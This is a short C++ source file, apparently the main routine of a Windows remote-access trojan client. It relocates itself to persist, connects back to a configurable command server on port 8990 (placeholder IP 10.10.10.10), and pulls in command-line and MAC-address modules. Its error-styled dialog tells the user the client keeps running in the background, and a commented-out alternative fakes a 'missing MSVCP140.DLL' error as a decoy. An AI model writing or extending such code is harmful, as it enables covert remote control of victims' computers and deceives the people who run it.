#define _CRT_SECURE_NO_WARNINGS
#include"ClientSocket.h"
#include"GetMAC.h"
#include"CmdLine.h"
#include"SelfRun.h"
#include<iostream>
#include <io.h>
#include<Windows.h>
using namespace std;


int main()
{
	int rt=SelfRun::MoveSelf();
	if (rt == 2)
	{
		ClientSocket ClientSocket2;
		char ip[16] = "10.10.10.10";//替换为服务器IP地址
		ClientSocket2.start(8990, ip);
	}
	else
	{
		char pName[MAX_PATH] = { 0 };
		char exeName[MAX_PATH] = { 0 };
		GetModuleFileNameA(NULL, pName, MAX_PATH);
		int i = 0;
		int j = 0;
		for (; pName[i] != '\0'; i++);
		for (; pName[i] != '\\'; i--);
		i++;
		for (; pName[i] != '\0'; i++)
		{
			exeName[j++] = pName[i];
		}
		exeName[j] = '\0';
		string title = "";
		title += exeName;
		title += " - 系统错误";
		if (rt == 4 || rt == 5)
		//MessageBox(NULL,"无法启动此程序,因为计算机中丢失MSVCP140.DLL", title.c_str(), MB_OK| MB_ICONERROR);
		MessageBox(NULL, "用户端执行成功，将在后台运行，想要清除用户端请使用用户端清除工具", title.c_str(), MB_OK | MB_ICONERROR);
	}

	return 0;
}
